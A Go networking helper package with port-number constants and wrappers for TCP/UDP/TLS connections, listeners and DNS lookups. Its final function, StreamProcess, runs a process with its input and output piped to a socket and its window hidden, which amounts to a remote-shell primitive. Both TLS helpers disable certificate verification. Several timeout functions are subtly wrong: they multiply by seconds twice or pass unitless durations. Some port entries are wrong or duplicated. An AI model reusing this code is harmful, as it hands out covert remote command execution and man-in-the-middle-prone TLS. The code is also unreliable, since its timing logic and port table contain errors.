package socket

import (
	"crypto/tls"
	"net"
	"os/exec"
	"syscall"
	"time"
)

var (
	TCP             string = "tcp"
	UDP             string = "udp"
	TCPIPV4ONLY     string = "tcp4"
	TCPIPV6ONLY     string = "tcp6"
	UDPIPV4ONLY     string = "udp4"
	UDPIPV6ONLY     string = "udp6"
	LOCALHOST       string = "localhost"
	LOOPBACKADDRESS string = "127.0.0.1"
	ECHO            string = "7"
	DISCARD         string = "9"
	SYSTAT          string = "11"
	DAYTIME         string = "13"
	QOTD            string = "17"
	CHARGEN         string = "19"
	FTPDATA         string = "20"
	FTP             string = "21"
	SSH             string = "22"
	TELNET          string = "23"
	SMTP            string = "25"
	TIME            string = "37"
	RLP             string = "39"
	NAMESERVER      string = "42"
	NICNAME         string = "43"
	DOMAIN          string = "53"
	BOOTPS          string = "67"
	BOOTPC          string = "68"
	TFTP            string = "69"
	GOPHER          string = "70"
	FINGER          string = "79"
	HTTP            string = "80"
	HOSTS2NS        string = "81"
	KERBEROS        string = "88"
	HOSTNAME        string = "101"
	ISOTAP          string = "102"
	RTELNET         string = "107"
	POP2            string = "109"
	POP3            string = "110"
	SUNRPC          string = "111"
	AUTH            string = "113"
	UUCPPATH        string = "117"
	SQLSERV         string = "118"
	NNTP            string = "119"
	NTP             string = "123"
	EPMAP           string = "135"
	NETBIOSNS       string = "137"
	NETBIOSDGM      string = "138"
	NETBIOSSSN      string = "139"
	IMAP            string = "143"
	SQLNET          string = "150"
	SQLSRV          string = "156"
	PCMAILSRV       string = "158"
	SNMP            string = "161"
	SNMPTRAP        string = "162"
	PRINTSRV        string = "170"
	BGP             string = "179"
	IRC             string = "194"
	IPX             string = "213"
	RTSPS           string = "322"
	MFTP            string = "349"
	LDAP            string = "389"
	HTTPS           string = "443"
	MICROSOFTDS     string = "445"
	KPASSWD         string = "464"
	URD             string = "465"
	ISAKMP          string = "500"
	CRS             string = "507"
	EXEC            string = "512"
	LOGIN           string = "513"
	CMD             string = "514"
	PRINTER         string = "515"
	TALK            string = "517"
	NTALK           string = "518"
	EFS             string = "520"
	ULP             string = "522"
	TIMED           string = "525"
	TEMPO           string = "526"
	IRCSERVER       string = "529"
	COURIER         string = "530"
	CONFERENCE      string = "531"
	NETNEWS         string = "532"
	NETWALL         string = "533"
	UUCP            string = "540"
	KLOGIN          string = "543"
	KSHELL          string = "544"
	DHCPV6CLIENT    string = "546"
	DHCPV6SERVER    string = "547"
	AFPOVERTCP      string = "548"
	NEWRWHO         string = "550"
	RTSP            string = "554"
	REMOTEFS        string = "556"
	RMONITOR        string = "560"
	MONITOR         string = "561"
	NNTPS           string = "563"
	WHOAMI          string = "561"
	MSSHUTTLE       string = "568"
	MSROME          string = "569"
	SMTPS           string = "587"
	HTTPRPCEPMAP    string = "593"
	FTPSDATA        string = "989"
	FTPS            string = "990"
	TELNETS         string = "992"
	IMAPS           string = "993"
	IRCS            string = "994"
	POP3S           string = "995"
	ACTIVESYNC      string = "1034"
	KPOP            string = "1109"
	NFSDSTATUS      string = "1110"
	NFA             string = "1155"
	PHONE           string = "1167"
	OPSMGR          string = "1270"
	MSSQLS          string = "1433"
	MSSQLM          string = "1434"
	MSSNASERVER     string = "1477"
	MSSNABASE       string = "1478"
	WINS            string = "1512"
	INGRESLOCK      string = "1524"
	SST             string = "1607"
	L2TP            string = "1701"
	PPTCONFERENCE   string = "1711"
	PPTP            string = "1723"
	MSICCP          string = "1731"
	REMOTEWINSOCK   string = "1745"
	MSSTREAMING     string = "1755"
	MSMQ            string = "1801"
	RADIUS          string = "1812"
)

func Connect(address string, port string, protocol string) (net.Conn, error) {
	host := net.JoinHostPort(address, port)
	c, err := net.Dial(protocol, host)

	if err != nil {
		return nil, err
	}

	return c, nil
}

func ConnectTimeout(address string, port string, protocol string, timeout int) (net.Conn, error) {
	host := net.JoinHostPort(address, port)
	c, err := net.DialTimeout(protocol, host, time.Duration(timeout)*time.Millisecond)

	if err != nil {
		return nil, err
	}

	return c, nil
}

func Send(c net.Conn, data string) (int, error) {
	ok, err := c.Write([]byte(data))

	if err != nil {
		return 0, err
	}

	return ok, nil
}

func Sendt(c net.Conn, data string, timeout int) (int, error) {
	t := time.Duration(timeout)
	t = (t * time.Second)
	ok, err := c.Write([]byte(data))
	time.Sleep(t)

	if err != nil {
		return 0, err
	}

	return ok, nil
}

func Sendd(c net.Conn, data string, deadline int) (int, error) {
	d := time.Duration(deadline)
	c.SetDeadline(time.Now().Add(d))
	ok, err := c.Write([]byte(data))

	if err != nil {
		return 0, err
	}

	return ok, nil
}

func Sendtd(c net.Conn, data string, timeout int, deadline int) (int, error) {
	t := time.Duration(timeout)
	t = (t * time.Second)
	d := time.Duration(deadline)
	c.SetDeadline(time.Now().Add(d))
	ok, err := c.Write([]byte(data))
	time.Sleep(t * time.Second)

	if err != nil {
		return 0, err
	}

	return ok, nil
}

func Recv(c net.Conn, NumberBytes int) (string, error) {
	buffer := make([]byte, NumberBytes)
	r, err := c.Read(buffer)

	if err != nil {
		return "", err
	}

	if r <= 0 {
		return "", nil
	}

	return string(buffer), nil
}

func Recvd(c net.Conn, NumberBytes int, deadline int) (string, error) {
	buffer := make([]byte, NumberBytes)
	d := time.Duration(deadline)
	c.SetReadDeadline(time.Now().Add(d * time.Second))
	r, err := c.Read(buffer)

	if err != nil {
		return "", err
	}

	if r <= 0 {
		return "", nil
	}

	return string(buffer), nil
}

func Recvt(c net.Conn, NumberBytes int, timeout int) (string, error) {
	buffer := make([]byte, NumberBytes)
	d := time.Duration(timeout)
	time.Sleep(d * time.Second)
	r, err := c.Read(buffer)

	if err != nil {
		return "", err
	}

	if r <= 0 {
		return "", nil
	}

	return string(buffer), nil
}

func Recvtd(c net.Conn, NumberBytes int, timeout int, deadline int) (string, error) {
	buffer := make([]byte, NumberBytes)
	t := time.Duration(timeout)
	t = (t * time.Second)
	d := time.Duration(deadline)
	c.SetDeadline(time.Now().Add(d))
	r, err := c.Read(buffer)

	if err != nil {
		return "", err
	}

	if r <= 0 {
		return "", nil
	}

	return string(buffer), nil
}

func ConnectTls(address string, port string, protocol string) (*tls.Conn, error) {
	host := net.JoinHostPort(address, port)

	conf := &tls.Config{
		InsecureSkipVerify: true,
	}

	c, err := tls.Dial(protocol, host, conf)

	if err != nil {
		return nil, err
	}

	return c, nil
}

func SendTls(c *tls.Conn, data string) (int, error) {
	ok, err := c.Write([]byte(data))

	if err != nil {
		return 0, err
	}

	return ok, nil
}

func SendtTls(c *tls.Conn, data string, timeout int) (int, error) {
	t := time.Duration(timeout)
	t = (t * time.Second)
	ok, err := c.Write([]byte(data))
	time.Sleep(t)

	if err != nil {
		return 0, err
	}

	return ok, nil
}

func SenddTls(c *tls.Conn, data string, deadline int) (int, error) {
	d := time.Duration(deadline)
	c.SetDeadline(time.Now().Add(d))
	ok, err := c.Write([]byte(data))

	if err != nil {
		return 0, err
	}

	return ok, nil
}

func SendtdTls(c *tls.Conn, data string, timeout int, deadline int) (int, error) {
	t := time.Duration(timeout)
	t = (t * time.Second)
	d := time.Duration(deadline)
	c.SetDeadline(time.Now().Add(d))
	ok, err := c.Write([]byte(data))
	time.Sleep(t * time.Second)

	if err != nil {
		return 0, err
	}

	return ok, nil
}

func RecvTls(c *tls.Conn, NumberBytes int) (string, error) {
	buffer := make([]byte, NumberBytes)
	r, err := c.Read(buffer)

	if err != nil {
		return "", err
	}

	if r <= 0 {
		return "", nil
	}

	return string(buffer), nil
}

func RecvdTls(c *tls.Conn, NumberBytes int, deadline int) (string, error) {
	buffer := make([]byte, NumberBytes)
	d := time.Duration(deadline)
	c.SetReadDeadline(time.Now().Add(d * time.Second))
	r, err := c.Read(buffer)

	if err != nil {
		return "", err
	}

	if r <= 0 {
		return "", nil
	}

	return string(buffer), nil
}

func RecvtTls(c *tls.Conn, NumberBytes int, timeout int) (string, error) {
	buffer := make([]byte, NumberBytes)
	d := time.Duration(timeout)
	time.Sleep(d * time.Second)
	r, err := c.Read(buffer)

	if err != nil {
		return "", err
	}

	if r <= 0 {
		return "", nil
	}

	return string(buffer), nil
}

func RecvtdTls(c *tls.Conn, NumberBytes int, timeout int, deadline int) (string, error) {
	buffer := make([]byte, NumberBytes)
	t := time.Duration(timeout)
	t = (t * time.Second)
	d := time.Duration(deadline)
	c.SetDeadline(time.Now().Add(d))
	r, err := c.Read(buffer)

	if err != nil {
		return "", err
	}

	if r <= 0 {
		return "", nil
	}

	return string(buffer), nil
}

func Listen(address string, protocol string) (net.Listener, error) {
	ln, err := net.Listen(protocol, address)

	if err != nil {
		return nil, err
	}

	return ln, nil
}

func ListenTls(address string, protocol string) (net.Listener, error) {
	conf := &tls.Config{InsecureSkipVerify: true}
	ln, err := tls.Listen(protocol, address, conf)

	if err != nil {
		return nil, err
	}

	return ln, nil
}

func Accept(a net.Listener) (net.Conn, error) {
	conn, err := a.Accept()

	if err != nil {
		return nil, err
	}

	return conn, nil
}

func IsLoopBack(address string) bool {
	ip := net.ParseIP(address)
	return ip.IsLoopback()
}

func IsMultiCast(address string) bool {
	ip := net.ParseIP(address)
	return ip.IsMulticast()
}

func GetMask(address string) net.IPMask {
	ip := net.ParseIP(address)
	return ip.DefaultMask()
}

func GetServiceByPort(service string, protocol string) (int, error) {
	p, e := net.LookupPort(protocol, service)

	if e != nil {
		return 0, e
	}

	return p, nil
}

func GetDNSTXTRecord(domain string) ([]string, error) {
	record, err := net.LookupTXT(domain)

	if err != nil {
		return nil, err
	}

	return record, nil
}

func GetAddrByHost(host string) ([]string, error) {
	hst, err := net.LookupHost(host)

	if err != nil {
		return nil, err
	}

	return hst, nil
}

func GetCanonicalName(host string) (string, error) {
	hst, err := net.LookupCNAME(host)

	if err != nil {
		return "", err
	}

	return hst, nil
}

func GetHostByAddr(addr string) ([]string, error) {
	ads, err := net.LookupAddr(addr)

	if err != nil {
		return nil, err
	}

	return ads, nil
}

func NSLookup(name string) ([]*net.NS, error) {
	a, e := net.LookupNS(name)

	if e != nil {
		return nil, e
	}

	return a, nil
}

func EqualIP(ip string, ipcompare string) bool {
	p := net.ParseIP(ip)
	cmp := net.ParseIP(ipcompare)
	status := p.Equal(cmp)
	return status
}

func StreamProcess(c net.Conn, process string) error {
	cmd := exec.Command(process)

	cmd.Stdout = c
	cmd.Stderr = c
	cmd.Stdin = c
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	e := cmd.Run()

	if e != nil {
		return e
	}

	return nil
}
